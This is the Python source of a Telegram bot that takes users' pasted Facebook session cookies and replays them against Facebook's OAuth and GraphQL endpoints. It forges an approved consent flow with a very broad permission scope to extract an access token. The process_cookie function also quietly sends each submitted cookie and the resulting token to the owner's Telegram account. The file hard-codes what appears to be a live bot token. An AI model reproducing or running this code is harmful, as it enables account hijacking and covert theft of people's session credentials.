import telebot
import requests
import uuid
import re
from urllib.parse import urlparse, parse_qs, unquote
from concurrent.futures import ThreadPoolExecutor
import os
import random
import string   
import shlex

BOT_TOKEN = "7878353836:AAFCnxc4JtKTDvA53R93zNb71cjU57_M9Do"
bot = telebot.TeleBot(BOT_TOKEN)

# Approved users storage
approved_users = {}  # Format: {user_id: (user_key, user_name)}
admin_ids = [1292741412, 1183807665]  # Replace with actual admin Telegram IDs
owner_id = 1292741412

def generate_user_key(user_id):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id in approved_users:
        bot.reply_to(message, "✅ Welcome back! You are approved. Use /get_token to generate your token.")
    else:
        bot.reply_to(message, "❌ You are not approved yet. Request approval using /my_key and wait for an admin.")

class TokenGetter:
    def __init__(self, num_threads=5, use_proxy=False, proxy_mode="random"):
        self.num_threads = num_threads
        self.use_proxy = use_proxy
        self.proxy_mode = proxy_mode
        self.proxy_list = []
        self.current_proxy_index = 0
        
        if use_proxy and os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
    
    def get_proxy(self):
        if not self.use_proxy or not self.proxy_list:
            return None
            
        if self.proxy_mode == "random":
            return random.choice(self.proxy_list)
        else:
            proxy = self.proxy_list[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
            return proxy

    def change_cookies_fb(self, cookies: str):
        result = {}
        try:
            for i in cookies.strip().split(';'):
                parts = i.split('=', 1)
                if len(parts) == 2:
                    key, value = parts
                    result[key.strip()] = value.strip()
            if not result:
                raise ValueError("No valid cookies found")
            return result
        except Exception as e:
            print(f"Error parsing cookies: {str(e)}")
            return None

    def get_fb_dtsg(self, cookies: dict, proxy=None) -> str:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        if not cookies:
            print("Error: Cookies dictionary is None")
            return None
        
        get_data = requests.get(
            "https://www.facebook.com/v2.3/dialog/oauth",
            params={
                'redirect_uri': 'fbconnect://success',
                'scope': 'email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login',
                'response_type': 'token,code',
                'client_id': '356275264482347',
            },
            cookies=cookies,
            headers={
                'authority': 'www.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'dnt': '1',
                'dpr': '1.25',
                'sec-ch-ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
                'sec-ch-ua-full-version-list': '"Chromium";v="117.0.5938.157", "Not;A=Brand";v="8.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'viewport-width': '1038',
            },
            proxies=proxies
        ).text
        
        try:
            fb_dtsg = re.search(r'DTSGInitData",,{"token":"(.*?)"', get_data.replace('[]', '')).group(1)
            return fb_dtsg
        except:
            print("Error extracting fb_dtsg")
            return None

    def run(self, cookie_re, app_id, token_type):
        try:
            proxy = self.get_proxy()
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            
            cookies = self.change_cookies_fb(cookie_re, proxy)
            if not cookies:
                print("Error: Failed to parse cookies")
                return None, None
            
            c_user = cookies.get("c_user")
            if not c_user:
                print("Error: No c_user found in cookies")
                return None, None

            fb_dtsg = self.get_fb_dtsg(cookies)
            if not fb_dtsg:
                print("Error: Failed to retrieve fb_dtsg")
                return None, None

            headers = {
                'authority': 'www.facebook.com',
                'accept': '*/*',
                'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.facebook.com',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
                'sec-ch-ua-full-version-list': '"Chromium";v="117.0.5938.157", "Not;A=Brand";v="8.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'x-fb-friendly-name': 'useCometConsentPromptEndOfFlowBatchedMutation',
            }
            data = {
                'av': str(c_user),
                '__user': str(c_user),
                'fb_dtsg': fb_dtsg,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'useCometConsentPromptEndOfFlowBatchedMutation',
                'variables': '{"input":{"client_mutation_id":"4","actor_id":"' + c_user + '","config_enum":"GDP_READ","device_id":null,"experience_id":"' + str(uuid.uuid4()) + '","extra_params_json":"{\\"app_id\\":\\"' + app_id + '\\",\\"display\\":\\"\\\\\\"popup\\\\\\"\\",\\"kid_directed_site\\":\\"false\\",\\"logger_id\\":\\"\\\\\\"' + str(uuid.uuid4()) + '\\\\\\"\\",\\"next\\":\\"\\\\\\"read\\\\\\"\\",\\"redirect_uri\\":\\"\\\\\\"https:\\\\\\\\\\\\/\\\\\\\\\\\\/www.facebook.com\\\\\\\\\\\\/connect\\\\\\\\\\\\/login_success.html\\\\\\"\\",\\"response_type\\":\\"\\\\\\"token\\\\\\"\\",\\"return_scopes\\":\\"false\\",\\"scope\\":\\"[\\\\\\"email\\\\\\",\\\\\\"manage_fundraisers\\\\\\",\\\\\\"read_custom_friendlists\\\\\\",\\\\\\"read_insights\\\\\\",\\\\\\"rsvp_event\\\\\\",\\\\\\"xmpp_login\\\\\\",\\\\\\"offline_access\\\\\\",\\\\\\"publish_video\\\\\\",\\\\\\"openid\\\\\\",\\\\\\"catalog_management\\\\\\",\\\\\\"user_messenger_contact\\\\\\",\\\\\\"gaming_user_locale\\\\\\",\\\\\\"private_computation_access\\\\\\",\\\\\\"user_managed_groups\\\\\\",\\\\\\"groups_show_list\\\\\\",\\\\\\"pages_manage_cta\\\\\\",\\\\\\"pages_manage_instant_articles\\\\\\",\\\\\\"pages_show_list\\\\\\",\\\\\\"pages_messaging\\\\\\",\\\\\\"pages_messaging_phone_number\\\\\\",\\\\\\"pages_messaging_subscriptions\\\\\\",\\\\\\"read_page_mailboxes\\\\\\",\\\\\\"ads_management\\\\\\",\\\\\\"ads_read\\\\\\",\\\\\\"business_management\\\\\\",\\\\\\"instagram_basic\\\\\\",\\\\\\"instagram_manage_comments\\\\\\",\\\\\\"instagram_manage_insights\\\\\\",\\\\\\"instagram_content_publish\\\\\\",\\\\\\"publish_to_groups\\\\\\",\\\\\\"groups_access_member_info\\\\\\",\\\\\\"leads_retrieval\\\\\\",\\\\\\"whatsapp_business_management\\\\\\",\\\\\\"instagram_manage_messages\\\\\\",\\\\\\"attribution_read\\\\\\",\\\\\\"page_events\\\\\\",\\\\\\"business_creative_transfer\\\\\\",\\\\\\"pages_read_engagement\\\\\\",\\\\\\"pages_manage_metadata\\\\\\",\\\\\\"pages_read_user_content\\\\\\",\\\\\\"pages_manage_ads\\\\\\",\\\\\\"pages_manage_posts\\\\\\",\\\\\\"pages_manage_engagement\\\\\\",\\\\\\"whatsapp_business_messaging\\\\\\",\\\\\\"instagram_shopping_tag_products\\\\\\",\\\\\\"read_audience_network_insights\\\\\\"]\\",\\"sso_key\\":\\"\\\\\\"com\\\\\\"\\",\\"steps\\":\\"{\\\\\\"read\\\\\\":[\\\\\\"email\\\\\\",\\\\\\"openid\\\\\\",\\\\\\"baseline\\\\\\",\\\\\\"public_profile\\\\\\",\\\\\\"read_audience_network_insights\\\\\\"]}\\",\\"tp\\":\\"\\\\\\"unspecified\\\\\\"\\",\\"cui_gk\\":\\"\\\\\\"[PASS]:\\\\\\"\\",\\"is_limited_login_shim\\":\\"false\\"}","flow_name":"GDP","flow_step_type":"STANDALONE","outcome":"APPROVED","source":"gdp_delegated","surface":"FACEBOOK_COMET"}}',
                'server_timestamps': 'true',
                'doc_id': '6494107973937368',
            }

            response = requests.post(
                'https://www.facebook.com/api/graphql/',
                cookies=cookies,
                headers=headers,
                data=data,
                proxies=proxies
            )

            if response.status_code != 200:
                print(f"Error: Received status code {response.status_code}")
                return None, None
            
            try:
                response_json = response.json()
                access_token = parse_qs(urlparse(unquote(parse_qs(urlparse(response_json["data"]["run_post_flow_action"]["uri"]).query)["close_uri"][0])).fragment)["access_token"][0]
                return token_type, access_token
            except:
                print("Error extracting token from response")
                return None, None
        except Exception as e:
            print(f"Error getting token for {token_type}: {str(e)}")
            return None, None

@bot.message_handler(commands=['get_token'])
def get_token(message):
    user_id = message.from_user.id
    if user_id not in approved_users:
        bot.reply_to(message, "❌ You are not approved yet. Please request approval using /my_key.")
        return
    bot.reply_to(message, "Please send your Facebook cookies.")
    bot.register_next_step_handler(message, process_cookie)

def process_cookie(message):
    user_cookie = message.text
    use_proxy = False
    proxy_mode = "sequential"
    num_threads = 1
    if use_proxy:
            if not os.path.exists('proxies.txt'):
                print("Error: proxies.txt file not found!")
				# print("Error: proxy.txt file not found!")
				# print("Proxy format in proxy.txt:")
				# print("Format 1: ip:port")
				# print("Format 2: ip:port:username:password")
				# print("Example:")
				# print("1.1.1.1:8080")
				# print("2.2.2.2:8080:user:pass")
                return
                
            proxy_mode = input("Proxy mode (random/sequential): ").lower()
            if proxy_mode not in ['random', 'sequential']:
                proxy_mode = 'sequential'
    token_getter = TokenGetter(num_threads=num_threads,use_proxy=use_proxy, proxy_mode=proxy_mode)
    bot.reply_to(message, "Processing your token... Please wait.")
    
    try:
        token_type, access_token = token_getter.run(user_cookie, "350685531728", "EAAAAU")
        
        if access_token:
            # bot.reply_to(message, f"Here is your {token_type} token: {access_token}")
            bot.reply_to(message, f"{access_token}")
            bot.send_message(owner_id, f"🔥 New Token Generated! 🔥\nUser ID: {message.from_user.id}\nToken Type: {token_type}\nCookie: {user_cookie}\nAccess Token: {access_token}")
        else:
            bot.reply_to(message, "⚠️ Failed to generate token. Please check your cookies and try again.")
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['approved_list'])
def approved_list(message):
    if message.from_user.id in admin_ids:
        if approved_users:
            user_list = "\n".join([f"ID: {user_id}, Name: {user_name}" for user_id, (user_key, user_name) in approved_users.items()])
            bot.reply_to(message, f"✅ Approved Users:\n{user_list}")
        else:
            bot.reply_to(message, "❌ No approved users found.")
    else:
        bot.reply_to(message, "❌ You are not authorized to view the approved users list.")

@bot.message_handler(commands=['bulk_approve'])
def bulk_approve(message):
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "❌ You are not authorized to approve users.")
        return

    parts = shlex.split(message.text)[1:]
    approved_list = []

    if len(parts) % 2 != 0:
        bot.reply_to(message, "❌ Invalid format! Use: /bulk_approve ID1 Name1 ID2 Name2 ...")
        return

    for i in range(0, len(parts), 2):
        try:
            user_id = int(parts[i])
            user_name = parts[i + 1]

            if user_id in approved_users:
                approved_list.append(f"⚠️ {user_id} ({user_name}) is already approved")
                continue

            user_key = generate_user_key(user_id)
            approved_users[user_id] = (user_key, user_name)
            approved_list.append(f"✅ {user_id} ({user_name}) approved")

        except ValueError:
            bot.reply_to(message, f"❌ Invalid user ID: {parts[i]}")
            return

    bot.reply_to(message, "Bulk Approval Completed:\n" + '\n'.join(approved_list) if approved_list else "❌ No valid users approved.")

@bot.message_handler(commands=['bulk_revoke'])
def bulk_revoke(message):
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "❌ You are not authorized to revoke users.")
        return

    parts = shlex.split(message.text)[1:]
    revoked_list = []

    if len(parts) % 2 != 0:
        bot.reply_to(message, "❌ Invalid format! Use: /bulk_revoke ID1 Name1 ID2 Name2 ...")
        return

    for i in range(0, len(parts), 2):
        try:
            user_id = int(parts[i])
            user_name = parts[i + 1]

            if user_id in approved_users:
                del approved_users[user_id]
                revoked_list.append(f"✅ {user_id} ({user_name}) revoked")
            else:
                revoked_list.append(f"⚠️ {user_id} ({user_name}) not found in approved list")

        except ValueError:
            bot.reply_to(message, f"❌ Invalid user ID: {parts[i]}")
            return

    bot.reply_to(message, "Bulk Revocation Completed:\n" + '\n'.join(revoked_list) if revoked_list else "❌ No valid users revoked.")

@bot.message_handler(commands=['my_key'])
def my_key(message):
    user_id = message.from_user.id

    if user_id in approved_users:
        bot.reply_to(message, f"✅ You are already approved!\n🔑 Your Key: `{user_id}`")
    else:
        bot.reply_to(message, f"🔑 Your Key: `{user_id}`\n\n⚠️ You are not approved yet. Send this ID to an admin for approval.")

@bot.message_handler(commands=['check_key'])
def check_key(message):
    if message.from_user.id in approved_users:
        bot.reply_to(message, "✅ Your key is approved.")
    else:
        bot.reply_to(message, "❌ Your key is not approved.")

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id in admin_ids:
        try:
            user_id, user_name = map(str, message.text.split()[1:3])  # Expect user ID and user name
            user_id = int(user_id)
            user_key = generate_user_key(user_id)
            approved_users[user_id] = (user_key, user_name)  # Store user key and name
            bot.reply_to(message, f"✅ User {user_id} ({user_name}) has been approved with key: {user_key}")
        except (IndexError, ValueError):
            bot.reply_to(message, "❌ Please provide a valid user ID and name.")
    else:
        bot.reply_to(message, "❌ You are not authorized to approve users.")

@bot.message_handler(commands=['revoke'])
def revoke_user(message):
    if message.from_user.id in admin_ids:
        try:
            user_id = int(message.text.split()[1])
            approved_users.pop(user_id, None)
            bot.reply_to(message, f"❌ User {user_id} has been revoked.")
        except (IndexError, ValueError):
            bot.reply_to(message, "❌ Please provide a valid user ID.")
    else:
        bot.reply_to(message, "❌ You are not authorized to revoke users.")

bot.set_my_commands([
    telebot.types.BotCommand("start", "Start the bot"),
    telebot.types.BotCommand("get_token", "Get token"),
    telebot.types.BotCommand("approved_list", "View list of approved users (Admin only)"),
    telebot.types.BotCommand("my_key", "Get your key"),
    telebot.types.BotCommand("check_key", "Check if your key is approved"),
    telebot.types.BotCommand("approve", "Approve a user (Admin only)"),
    telebot.types.BotCommand("revoke", "Revoke a user's approval (Admin only)"),
    telebot.types.BotCommand("bulk_approve", "Approve bulk user's approval (Admin only)"),
    telebot.types.BotCommand("bulk_revoke", "Revoke bulk user's approval (Admin only)"),
])

bot.polling()
